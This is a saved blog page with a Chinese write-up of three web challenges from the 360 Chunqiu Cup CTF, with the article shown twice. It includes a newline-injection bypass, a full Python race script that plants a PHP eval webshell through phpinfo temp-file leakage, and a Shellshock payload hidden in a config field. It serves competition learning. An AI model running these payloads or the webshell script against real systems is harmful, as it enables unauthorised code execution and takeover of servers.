@@ -1,0 +1,548 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./360春秋杯-线上赛-web-Writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./360春秋杯-线上赛-web-Writeup/screen.css" rel="stylesheet"/>
+<link href="./360春秋杯-线上赛-web-Writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./360春秋杯-线上赛-web-Writeup/bendawang.css" rel="stylesheet"/>
+<script src="./360春秋杯-线上赛-web-Writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./360春秋杯-线上赛-web-Writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./360春秋杯-线上赛-web-Writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h2 id="whereismycat">where is my cat</h2>
+<p style="max-width:100%;height:auto;">进去之后抓包发现cookie里面有个可疑的host=0，想办法瞎改了半天没动静，后来师傅说改成证书host就好了，然后看了看证书
+<br/><img alt="" data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/58f978b66b4b9546b7000002.png" style="max-width:100%;height:auto;"/><br/>
+把cookie里面的host改成这个<code style="max-width:100%;height:auto;">where_is_my_cat.ichunqiu.com</code>就拿到flag了。</p>
+<h2 id="">写一写 看一看</h2>
+<p style="max-width:100%;height:auto;">进去之后扫到个<code style="max-width:100%;height:auto;">index.txt</code>，知道了有个<code style="max-width:100%;height:auto;">exec.php</code>,访问拿到源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;"> &lt;?php
+    highlight_file(__FILE__);
+    $dir = &amp;apos;tmp/&amp;apos;; 
+    if(!file_exists($dir))
+    mkdir($dir);   
+    chdir($dir);
+    if(!isset($_GET[&amp;apos;shell&amp;apos;])){
+    phpinfo();
+    exit();
+    }
+    $shell = $_GET[&amp;apos;shell&amp;apos;];
+    for ( $i=0; $i&lt;count($shell); $i++ ){
+        if ( !preg_match(&amp;apos;/^\w+$/&amp;apos;, $shell[$i]) )
+            exit();
+    }  
+    session_start();
+    $path = $_SESSION[&amp;apos;path&amp;apos;];
+    $shell =  str_replace(&amp;apos;path&amp;apos;,&amp;apos;/&amp;apos;.$path,implode(" ",$shell));
+    echo $shell;
+    exec("/bin/hence " . $shell);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">根据这篇文章<code style="max-width:100%;height:auto;">https://github.com/p4-team/ctf/tree/master/2015-10-18-hitcon/web_100_babyfirst</code>知道我们可以通过<code style="max-width:100%;height:auto;">%0a</code>绕过正则执行自己的命令，但是问题来了，本题目的服务器无法连接外网，就没有办法wget之类的，也就是我们得想办法在服务器上完成一切操作，但是我们可以执行php命令，加上有一个<code style="max-width:100%;height:auto;">phpinfo()</code>，根据<code style="max-width:100%;height:auto;">http://www.freebuf.com/articles/web/79830.html</code>的思路，我们可以类推，如果我们知道临时文件名<code style="max-width:100%;height:auto;">/tmp/xxxxxxxx</code>,那么我们就可以调用php命令去执行他，比如我的临时文件里面的内容</p>
+<pre><code style="max-width:100%;height:auto;">&lt;?php fputs(fopen(&amp;apos;/var/www/html/tmp/bendawang/bendawang.php&amp;apos;,"w"),"&lt;?php eval($_POST[a]);?&gt;")?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">我用php命令执行它，就会在<code style="max-width:100%;height:auto;">/var/www/html/tmp/bendawang</code>目录下生成一个<code style="max-width:100%;height:auto;">webshell</code>，就算成功了，但是由于<code style="max-width:100%;height:auto;">exec.php</code>的工作目录切换到了<code style="max-width:100%;height:auto;">/var/www/html/tmp</code>,所以我们要先建立一个文件夹，当然也可以不用，只是为了防止别人轻易拿到你这个<code style="max-width:100%;height:auto;">webshell.php</code></p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://106.75.34.78:2081/exec.php?shell[]=bdw%0a&amp;shell[]=mkdir&amp;shell[]=bendawang
+</code></pre>
+<p style="max-width:100%;height:auto;">建好文件夹，然后直接借用
+<code style="max-width:100%;height:auto;">http://www.voidcn.com/blog/hxsstar/article/p-2897846.html</code>所给的脚本修改如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">#!/usr/bin/env python
+# encoding=utf-8
+# Author : idwar
+# http://secer.org
+
+
+&amp;apos;&amp;apos;&amp;apos;
+可能需要你改的几个地方：
+1、host
+2、port
+3、request中的phpinfo页面名字及路径
+4、hello_lfi() 函数中的url，即存在lfi的页面和参数
+5、如果不成功或报错，尝试增加padding长度到7000、8000试试
+6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改
+ Good Luck :)
+&amp;apos;&amp;apos;&amp;apos;
+
+import re
+import urllib2
+import hashlib
+from socket import *
+from time import sleep
+import threading
+host = &amp;apos;106.75.34.78&amp;apos;
+#host = gethostbyname(domain)
+port = 2081
+shell_name = &amp;apos;bendawang.php&amp;apos;
+pattern = re.compile(r&amp;apos;&amp;apos;&amp;apos;\[tmp_name\]\s=&amp;gt;\s(.*)\W*error]&amp;apos;&amp;apos;&amp;apos;)
+
+payload = &amp;apos;&amp;apos;&amp;apos;idwar&lt;?php fputs(fopen(&amp;apos;/var/www/html/tmp/bendawang/&amp;apos;&amp;apos;&amp;apos; + shell_name + &amp;apos;&amp;apos;&amp;apos;\&amp;apos;,"w"),"idwar was here&lt;?php eval(\$_POST[a]);?&gt;")?&gt;\r&amp;apos;&amp;apos;&amp;apos;
+req = &amp;apos;&amp;apos;&amp;apos;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&amp;apos;&amp;apos;&amp;apos; % payload
+
+padding=&amp;apos;A&amp;apos; * 8000
+request=&amp;apos;&amp;apos;&amp;apos;POST /exec.php?a=&amp;apos;&amp;apos;&amp;apos;+padding+&amp;apos;&amp;apos;&amp;apos; HTTP/1.0\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&amp;apos;&amp;apos;&amp;apos;+padding+&amp;apos;&amp;apos;&amp;apos;\r
+HTTP_ACCEPT: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+HTTP_USER_AGENT: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+HTTP_ACCEPT_LANGUAGE: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+HTTP_PRAGMA: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&amp;apos;&amp;apos;&amp;apos; % (len(req), host, req)
+
+
+def hello_lfi():
+    while 1:
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect((host, port))
+        s.send(request)
+        data = &amp;apos;&amp;apos;
+        while r&amp;apos;&lt;/body&gt;&lt;/html&gt;&amp;apos; not in data:
+            data = s.recv(9999)
+            #print data
+            search_ = re.search(pattern, data)
+            if search_:
+                tmp_file_name = search_.group(1).replace("/","path")
+                print tmp_file_name
+                url = r&amp;apos;http://106.75.34.78:2081/exec.php?shell[]=bdw%0a&amp;shell[]=php&amp;shell[]=&amp;apos; + tmp_file_name
+                print url
+                search_request = urllib2.Request(url)
+                search_response = urllib2.urlopen(search_request)
+                html_data = search_response.read()
+                if &amp;apos;idwar&amp;apos; in html_data:
+                    s.close()
+                    return &amp;apos;\nDone. Your webshell is : \n\n%s\n&amp;apos; % (&amp;apos;http://&amp;apos; + host + &amp;apos;/&amp;apos; + shell_name)
+                    #import sys;sys.exit()
+        s.close()
+if __name__ == &amp;apos;__main__&amp;apos;:
+    for i in xrange(40):
+        t1 = threading.Thread(target=hello_lfi, args=()) # 一个线程上传
+        t1.start()
+        print i
+    print &amp;apos;\n Good Luck :)&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">由于服务器太差了，跑了很久才成功，而且第二天想要再重跑的时候已经跑不成功了，附上最后的flag截图
+<br/><img alt="" data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/58f8c2272edfa20dd2000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="mail">mail</h2>
+<p style="max-width:100%;height:auto;">首先用<code style="max-width:100%;height:auto;">admin admin</code>登陆进去系统，后来扫了扫目录发现了一个<code style="max-width:100%;height:auto;">web.tar.gz</code>,把源码down下来，审了好久，发现几乎不可能有sql注入点，不过<code style="max-width:100%;height:auto;">config.php</code>里面的这个地方有点可疑</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(ini_get(&amp;apos;register_globals&amp;apos;)){
+   foreach($_REQUEST as $k=&gt;$v) unset(${$k});
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">但是就算变量覆盖也没找到地方，而且这里我们目录下扫到了一个<code style="max-width:100%;height:auto;">flag.php</code>，也就是说flag必然不会在数据库里面，后来怀疑是这里<code style="max-width:100%;height:auto;">send.php</code>下的这里</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$to = $row[&amp;apos;email&amp;apos;];
+$subject = $row[&amp;apos;title&amp;apos;];
+$message = $row[&amp;apos;content&amp;apos;];
+$from = getConfig(&amp;apos;send_mail&amp;apos;);
+$headers = "From: $from";
+mail($to,$subject,$message,$headers);
+</code></pre>
+<p style="max-width:100%;height:auto;">会不会有<code style="max-width:100%;height:auto;">phpmailer</code>的命令执行，但是我们知道那个命令执行是在<code style="max-width:100%;height:auto;">mail()</code>的第五个参数上面，也就是失败了，后来看到这里，在<code style="max-width:100%;height:auto;">config.php</code>下面有个</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$timezone = getConfig(&amp;apos;timezone&amp;apos;);
+if($timezone != "")
+{
+  putenv("TZ=$timezone");
+}else{
+  putenv("TZ=Asia/Shanghai");
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">然后猜测是不是破壳漏洞，然后看到了<code style="max-width:100%;height:auto;">option.php</code>下面是这样子的</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+include &amp;apos;inc/function.php&amp;apos;;
+include &amp;apos;inc/config.php&amp;apos;;
+
+if($_GET[&amp;apos;action&amp;apos;]== &amp;apos;save&amp;apos;)
+{
+  $config = $_POST[&amp;apos;config&amp;apos;];
+
+  saveConfig($config);
+
+  die("&lt;script&gt;alert(&amp;apos;保存成功！&amp;apos;);history.go(-1);&lt;/script&gt;");
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">也就是说我们可以控制config的所有内容，即我们可以控制<code style="max-width:100%;height:auto;">$timezone</code>变量，然后尝试是不是破壳漏洞，最后向<code style="max-width:100%;height:auto;">options.php</code>发送的<code style="max-width:100%;height:auto;">payload</code>如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">config[root_path]=/var/www/html&amp;config[send_mail]=xxx@mail.com&amp;config[timezone]=() { :;}; /bin/cat /var/www/html/flag.php &gt; /var/www/html/upload/bendawang.txt
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下：
+<br/><img alt="" data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/58f973376b4b9546b7000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;"><br/><img alt=" " data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/getImagefileId=58f973256b4b9546b7000000" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./360春秋杯-线上赛-web-Writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h2 id="whereismycat">where is my cat</h2>
+<p style="max-width:100%;height:auto;">进去之后抓包发现cookie里面有个可疑的host=0，想办法瞎改了半天没动静，后来师傅说改成证书host就好了，然后看了看证书
+<br/><img alt="" data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/58f978b66b4b9546b7000002.png" style="max-width:100%;height:auto;"/><br/>
+把cookie里面的host改成这个<code style="max-width:100%;height:auto;">where_is_my_cat.ichunqiu.com</code>就拿到flag了。</p>
+<h2 id="">写一写 看一看</h2>
+<p style="max-width:100%;height:auto;">进去之后扫到个<code style="max-width:100%;height:auto;">index.txt</code>，知道了有个<code style="max-width:100%;height:auto;">exec.php</code>,访问拿到源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;"> &lt;?php
+    highlight_file(__FILE__);
+    $dir = &amp;apos;tmp/&amp;apos;; 
+    if(!file_exists($dir))
+    mkdir($dir);   
+    chdir($dir);
+    if(!isset($_GET[&amp;apos;shell&amp;apos;])){
+    phpinfo();
+    exit();
+    }
+    $shell = $_GET[&amp;apos;shell&amp;apos;];
+    for ( $i=0; $i&lt;count($shell); $i++ ){
+        if ( !preg_match(&amp;apos;/^\w+$/&amp;apos;, $shell[$i]) )
+            exit();
+    }  
+    session_start();
+    $path = $_SESSION[&amp;apos;path&amp;apos;];
+    $shell =  str_replace(&amp;apos;path&amp;apos;,&amp;apos;/&amp;apos;.$path,implode(" ",$shell));
+    echo $shell;
+    exec("/bin/hence " . $shell);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">根据这篇文章<code style="max-width:100%;height:auto;">https://github.com/p4-team/ctf/tree/master/2015-10-18-hitcon/web_100_babyfirst</code>知道我们可以通过<code style="max-width:100%;height:auto;">%0a</code>绕过正则执行自己的命令，但是问题来了，本题目的服务器无法连接外网，就没有办法wget之类的，也就是我们得想办法在服务器上完成一切操作，但是我们可以执行php命令，加上有一个<code style="max-width:100%;height:auto;">phpinfo()</code>，根据<code style="max-width:100%;height:auto;">http://www.freebuf.com/articles/web/79830.html</code>的思路，我们可以类推，如果我们知道临时文件名<code style="max-width:100%;height:auto;">/tmp/xxxxxxxx</code>,那么我们就可以调用php命令去执行他，比如我的临时文件里面的内容</p>
+<pre><code style="max-width:100%;height:auto;">&lt;?php fputs(fopen(&amp;apos;/var/www/html/tmp/bendawang/bendawang.php&amp;apos;,"w"),"&lt;?php eval($_POST[a]);?&gt;")?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">我用php命令执行它，就会在<code style="max-width:100%;height:auto;">/var/www/html/tmp/bendawang</code>目录下生成一个<code style="max-width:100%;height:auto;">webshell</code>，就算成功了，但是由于<code style="max-width:100%;height:auto;">exec.php</code>的工作目录切换到了<code style="max-width:100%;height:auto;">/var/www/html/tmp</code>,所以我们要先建立一个文件夹，当然也可以不用，只是为了防止别人轻易拿到你这个<code style="max-width:100%;height:auto;">webshell.php</code></p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://106.75.34.78:2081/exec.php?shell[]=bdw%0a&amp;shell[]=mkdir&amp;shell[]=bendawang
+</code></pre>
+<p style="max-width:100%;height:auto;">建好文件夹，然后直接借用
+<code style="max-width:100%;height:auto;">http://www.voidcn.com/blog/hxsstar/article/p-2897846.html</code>所给的脚本修改如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">#!/usr/bin/env python
+# encoding=utf-8
+# Author : idwar
+# http://secer.org
+
+
+&amp;apos;&amp;apos;&amp;apos;
+可能需要你改的几个地方：
+1、host
+2、port
+3、request中的phpinfo页面名字及路径
+4、hello_lfi() 函数中的url，即存在lfi的页面和参数
+5、如果不成功或报错，尝试增加padding长度到7000、8000试试
+6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改
+ Good Luck :)
+&amp;apos;&amp;apos;&amp;apos;
+
+import re
+import urllib2
+import hashlib
+from socket import *
+from time import sleep
+import threading
+host = &amp;apos;106.75.34.78&amp;apos;
+#host = gethostbyname(domain)
+port = 2081
+shell_name = &amp;apos;bendawang.php&amp;apos;
+pattern = re.compile(r&amp;apos;&amp;apos;&amp;apos;\[tmp_name\]\s=&amp;gt;\s(.*)\W*error]&amp;apos;&amp;apos;&amp;apos;)
+
+payload = &amp;apos;&amp;apos;&amp;apos;idwar&lt;?php fputs(fopen(&amp;apos;/var/www/html/tmp/bendawang/&amp;apos;&amp;apos;&amp;apos; + shell_name + &amp;apos;&amp;apos;&amp;apos;\&amp;apos;,"w"),"idwar was here&lt;?php eval(\$_POST[a]);?&gt;")?&gt;\r&amp;apos;&amp;apos;&amp;apos;
+req = &amp;apos;&amp;apos;&amp;apos;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&amp;apos;&amp;apos;&amp;apos; % payload
+
+padding=&amp;apos;A&amp;apos; * 8000
+request=&amp;apos;&amp;apos;&amp;apos;POST /exec.php?a=&amp;apos;&amp;apos;&amp;apos;+padding+&amp;apos;&amp;apos;&amp;apos; HTTP/1.0\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&amp;apos;&amp;apos;&amp;apos;+padding+&amp;apos;&amp;apos;&amp;apos;\r
+HTTP_ACCEPT: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+HTTP_USER_AGENT: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+HTTP_ACCEPT_LANGUAGE: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+HTTP_PRAGMA: &amp;apos;&amp;apos;&amp;apos; + padding + &amp;apos;&amp;apos;&amp;apos;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&amp;apos;&amp;apos;&amp;apos; % (len(req), host, req)
+
+
+def hello_lfi():
+    while 1:
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect((host, port))
+        s.send(request)
+        data = &amp;apos;&amp;apos;
+        while r&amp;apos;&lt;/body&gt;&lt;/html&gt;&amp;apos; not in data:
+            data = s.recv(9999)
+            #print data
+            search_ = re.search(pattern, data)
+            if search_:
+                tmp_file_name = search_.group(1).replace("/","path")
+                print tmp_file_name
+                url = r&amp;apos;http://106.75.34.78:2081/exec.php?shell[]=bdw%0a&amp;shell[]=php&amp;shell[]=&amp;apos; + tmp_file_name
+                print url
+                search_request = urllib2.Request(url)
+                search_response = urllib2.urlopen(search_request)
+                html_data = search_response.read()
+                if &amp;apos;idwar&amp;apos; in html_data:
+                    s.close()
+                    return &amp;apos;\nDone. Your webshell is : \n\n%s\n&amp;apos; % (&amp;apos;http://&amp;apos; + host + &amp;apos;/&amp;apos; + shell_name)
+                    #import sys;sys.exit()
+        s.close()
+if __name__ == &amp;apos;__main__&amp;apos;:
+    for i in xrange(40):
+        t1 = threading.Thread(target=hello_lfi, args=()) # 一个线程上传
+        t1.start()
+        print i
+    print &amp;apos;\n Good Luck :)&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">由于服务器太差了，跑了很久才成功，而且第二天想要再重跑的时候已经跑不成功了，附上最后的flag截图
+<br/><img alt="" data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/58f8c2272edfa20dd2000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="mail">mail</h2>
+<p style="max-width:100%;height:auto;">首先用<code style="max-width:100%;height:auto;">admin admin</code>登陆进去系统，后来扫了扫目录发现了一个<code style="max-width:100%;height:auto;">web.tar.gz</code>,把源码down下来，审了好久，发现几乎不可能有sql注入点，不过<code style="max-width:100%;height:auto;">config.php</code>里面的这个地方有点可疑</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(ini_get(&amp;apos;register_globals&amp;apos;)){
+   foreach($_REQUEST as $k=&gt;$v) unset(${$k});
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">但是就算变量覆盖也没找到地方，而且这里我们目录下扫到了一个<code style="max-width:100%;height:auto;">flag.php</code>，也就是说flag必然不会在数据库里面，后来怀疑是这里<code style="max-width:100%;height:auto;">send.php</code>下的这里</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$to = $row[&amp;apos;email&amp;apos;];
+$subject = $row[&amp;apos;title&amp;apos;];
+$message = $row[&amp;apos;content&amp;apos;];
+$from = getConfig(&amp;apos;send_mail&amp;apos;);
+$headers = "From: $from";
+mail($to,$subject,$message,$headers);
+</code></pre>
+<p style="max-width:100%;height:auto;">会不会有<code style="max-width:100%;height:auto;">phpmailer</code>的命令执行，但是我们知道那个命令执行是在<code style="max-width:100%;height:auto;">mail()</code>的第五个参数上面，也就是失败了，后来看到这里，在<code style="max-width:100%;height:auto;">config.php</code>下面有个</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$timezone = getConfig(&amp;apos;timezone&amp;apos;);
+if($timezone != "")
+{
+  putenv("TZ=$timezone");
+}else{
+  putenv("TZ=Asia/Shanghai");
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">然后猜测是不是破壳漏洞，然后看到了<code style="max-width:100%;height:auto;">option.php</code>下面是这样子的</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+include &amp;apos;inc/function.php&amp;apos;;
+include &amp;apos;inc/config.php&amp;apos;;
+
+if($_GET[&amp;apos;action&amp;apos;]== &amp;apos;save&amp;apos;)
+{
+  $config = $_POST[&amp;apos;config&amp;apos;];
+
+  saveConfig($config);
+
+  die("&lt;script&gt;alert(&amp;apos;保存成功！&amp;apos;);history.go(-1);&lt;/script&gt;");
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">也就是说我们可以控制config的所有内容，即我们可以控制<code style="max-width:100%;height:auto;">$timezone</code>变量，然后尝试是不是破壳漏洞，最后向<code style="max-width:100%;height:auto;">options.php</code>发送的<code style="max-width:100%;height:auto;">payload</code>如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">config[root_path]=/var/www/html&amp;config[send_mail]=xxx@mail.com&amp;config[timezone]=() { :;}; /bin/cat /var/www/html/flag.php &gt; /var/www/html/upload/bendawang.txt
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下：
+<br/><img alt="" data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/58f973376b4b9546b7000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;"><br/><img alt=" " data-action="zoom" src="./360春秋杯-线上赛-web-Writeup/getImagefileId=58f973256b4b9546b7000000" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./360春秋杯-线上赛-web-Writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./360春秋杯-线上赛-web-Writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./360春秋杯-线上赛-web-Writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./360春秋杯-线上赛-web-Writeup/prism.js"></script>
+<script src="./360春秋杯-线上赛-web-Writeup/zooming.js"></script>
+<script src="./360春秋杯-线上赛-web-Writeup/Bendawang.js"></script>
+
+
